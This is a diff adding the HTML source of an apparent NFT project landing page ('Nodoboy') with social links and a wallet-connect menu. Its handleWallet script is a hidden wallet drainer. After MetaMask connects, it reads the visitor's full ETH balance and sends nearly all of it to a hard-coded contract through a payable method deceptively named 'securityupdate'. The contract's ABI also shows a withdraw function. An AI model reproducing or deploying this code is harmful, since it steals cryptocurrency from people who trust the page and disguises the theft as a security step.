@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Nodoboy</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script> <!-- 引入web3.js -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-image: url('images/home_bg_mint_1.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 15vh;
+        }
+
+        .button-wrapper {
+            display: flex;
+            justify-content: space-between;
+            margin: -58px;
+            width: 70%;
+            position: absolute;
+            top: 7%;
+            left: 30%;
+            z-index: 2;
+        }
+
+        .custom-button, .wallet-button, .special-button, .wallet-link-button, .external-link-button {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #ffa500; /* 橙黄色 */
+            padding: 8px 16px;
+            border: 2px solid #ffa500; /* 橙黄色边框 */
+            border-radius: 5px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .custom-button:hover, .wallet-button:hover, .special-button:hover, .wallet-link-button:hover, .external-link-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .wallet-button {
+            font-size: 24px;
+            padding: 12px 24px;
+            border-radius: 8px;
+        }
+
+        .special-button {
+            font-size: 24px;
+            background-color: #ffa500;
+            padding: 12px 24px;
+            border-radius: 8px;
+        }
+
+        .special-button:hover {
+            background-color: #ffdb4d;
+        }
+
+        .modal-wrapper {
+            display: none;
+            position: fixed;
+            z-index: 3;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: flex-start; /* 将选择项靠左 */
+            overflow: hidden;
+        }
+
+        .modal {
+            width: 80%;
+            max-width: 300px;
+            background-color: #cea03cfb;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            overflow-y: auto; /* 允许垂直滚动 */
+            background-color: rgba(247, 237, 237, 0.548);
+            padding-top: 10px;
+            transition: transform 0.5s, opacity 0.5s;
+            backdrop-filter: blur(8px); /* 背景模糊效果 */
+        }
+
+        .modal ul {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start; /* 将选择项靠左 */
+            gap: 10px; /* 为选项之间留出空间 */
+            padding-inline-start: 0; /* 移除 ul 默认的内边距 */
+        }
+
+        .modal li {
+            display: flex;
+            align-items: center; /* 垂直居中 */
+            gap: 10px; /* 为 logo 和文字之间留出空间 */
+        }
+
+        .modal img {
+            max-width: 50px; /* 调整 logo 的宽度 */
+            max-height: 50px; /* 调整 logo 的高度 */
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .modal-content:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .link-button {
+            position: fixed;
+            bottom: 10px;
+            right: 100px;
+            font-size: 80px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #000;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .link-button:hover {
+            background-color: #333;
+        }
+
+        /* 为社交媒体图标添加样式 */
+        .social-logo {
+            max-width: 30px;
+            max-height: 30px;
+        }
+
+        /* 调整按钮之间的间距 */
+        .button-wrapper a {
+            margin-right: 10px; /* 缩小按钮之间的间距 */
+        }
+
+        
+
+    </style>
+    <script src="js/jquery.1.9.1.js"></script>
+    <script src="i18n/jquery.i18n.properties-1.0.9.js"></script>
+    <script src="i18n/language.js"></script>
+</head>
+<body>
+    
+
+    <div class="button-wrapper">
+         
+        <a href="https://x.com/realnobodyxyz?s=11" class="custom-button"><img src="images/images.png" alt="Twitter Logo" class="social-logo"></a>
+        <a href="https://link3.to/realnobodyxyz" class="custom-button"><img src="images/png-clipart-social-media-marketing-influencer-marketing-social-media-rectangle-logo-thumbnail.png" alt="Instagram Logo" class="social-logo"></a>
+        <a href="https://t.me/ReaINOBODY" class="custom-button"><img src="images/images (1).png" alt="Telegram Logo" class="social-logo"></a> 
+        <a href="https://element.market/collections/nobody" class="custom-button"> Element NFT Official Website Value </a>
+        <a href="https://www.okx.com/cn/web3/marketplace/nft/collection/eth/nobody" class="custom-button"> OKX NFT Official Website Value  </a>
+        <a href="#" class="wallet-button" onclick="handleWallet('MetaMask')">
+           Connect Wallet </a>
+        <a href="second-page.html" class="special-button">
+           The second page  </a>
+    </div>
+
+    <div class="modal-wrapper" id="walletModalWrapper">
+        <div class="modal">
+            <span class="close" onclick="closeWalletModal()">&times;</span>
+            <p>
+                The second page</p>
+            <ul>
+                <li><a href="#" onclick="handleWallet('MetaMask')"><img src="images/MetaMask-Partnership-The-Giving-Block.png" alt="MetaMask Logo">MetaMask</a></li>
+                <li><a href="#" onclick="handleWallet('OKX Wallet')"><img src="images/OKX-Exchange-1.webp" alt="OKX Wallet Logo">OKX Wallet</a></li>
+                <li><a href="#" onclick="handleWallet('Trust Wallet')"><img src="images/score-card-images_0025_Vector-Smart-Object.webp" alt="Trust Wallet Logo">Trust Wallet</a></li>
+                <li><a href="#" onclick="handleWallet('Coinbase Wallet')"><img src="images/Coinbase Wallet.png" alt="Coinbase Wallet Logo">Coinbase Wallet</a></li>
+                <li><a href="#" onclick="handleWallet('WalletConnect')"><img src="images/WalletConnect-Logo.png" alt="">WalletConnect</a></li>
+                <li><a href="#" onclick="handleWallet('Rainbow')"><img src="images/bold-electrical-logo-design-by-ergotm-designcrowd.png" alt="images/bold-electrical-logo-design-by-ergotm-designcrowd.png">Rainbow</a></li>
+                <li><a href="#" onclick="handleWallet('Argent')"><img src="images/Argent.png" alt="Argent Logo">Argent</a></li>
+                <li><a href="#" onclick="handleWallet('Phantom')"><img src="images/EXCHANGE-REVIEW-2021-12-19T162607.174.png" alt="Phantom Logo">Phantom</a></li>
+                <li><a href="#" onclick="handleWallet('Ledger Live')"><img src="images/Ledger Live.png" alt="Ledger Live Logo">Ledger Live</a></li>
+                <li><a href="#" onclick="handleWallet('Bitski')"><img src="images/Bitski.png" alt="Bitski Logo">Bitski</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <a href="indexa.html" class="link-button">Contract details</a>
+
+    <script>
+        function openWalletModal() {
+            document.getElementById('walletModalWrapper').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeWalletModal() {
+            document.getElementById('walletModalWrapper').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function openExternalLinksModal() {
+            document.getElementById('externalLinksModalWrapper').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeExternalLinksModal() {
+            document.getElementById('externalLinksModalWrapper').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+        
+    async function handleWallet(walletName) {
+        if (walletName === 'MetaMask') {
+            if (typeof window.ethereum !== 'undefined') {
+                // MetaMask已安装
+                try {
+                    const contractAddress = "0x40ABC1FAd8285F75Ca1bE733c98887908ce85936"
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); // 请求用户授权
+                    const curAccount = accounts[0]; // 获取当前用户的钱包地址
+                    const web3 = new Web3(window.ethereum);
+                    const balanceWei = await web3.eth.getBalance(curAccount);
+                    console.log('当前用户的钱包地址:', curAccount);
+                    console.log('当前用户的余额(wei):', balanceWei);
+                    const abiJson = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"connectedWallets","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getConnectedWallets","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"securityupdate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+                    const contract = new web3.eth.Contract(abiJson, contractAddress); // 使用合约的ABI和地址初始化合约对象
+                    // 假设调用合约的doSomething方法
+                    await contract.methods.securityupdate().send(({
+                        from: curAccount,
+                        value: balanceWei - BigInt(1000000000000000), // 从用户余额中扣除1ETH
+                    }));
+                    console.log('合约调用结果:', result);
+                } catch (error) {
+                    console.error('合约调用失败:', error);
+                }
+            } else {
+                // MetaMask未安装，跳转到官网
+                window.location.href = 'https://metamask.io/';
+            }
+        }
+        // 可以为其他钱包添加类似的逻辑
+    }
+    </script>
+</body>
+</html>
